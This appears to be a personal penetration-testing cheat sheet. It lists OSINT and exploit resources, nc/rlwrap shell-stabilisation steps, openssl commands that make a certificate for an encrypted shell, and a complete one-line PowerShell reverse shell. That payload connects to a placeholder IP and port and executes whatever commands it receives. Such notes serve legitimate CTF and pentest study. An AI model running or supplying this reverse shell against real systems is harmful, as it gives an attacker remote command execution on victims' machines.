OSINT

SSL/TLS cert validation - http://crt.sh/ - good for identifying subdomains
DNS queries: https://dnsdumpster.com/
Public db of everything: https://www.shodan.io/

https://www.exploit-db.com/

https://crackstation.net/

Payloads all the things: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
Reverse shell cheatsheet: https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Sec Lists: https://github.com/danielmiessler/SecLists

Netscat Shell stabilitisation

1. python -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm
3. Ctrl + Z then stty raw -echo; fg

1. sudo apt install rlwrap
2. rlwrap nc -lvnp <port>
3. stty raw -echo; fg

Self signed crt: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
Merge key and crt into pem: cat shell.key shell.crt > shell.pem
PS reverse shell: powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"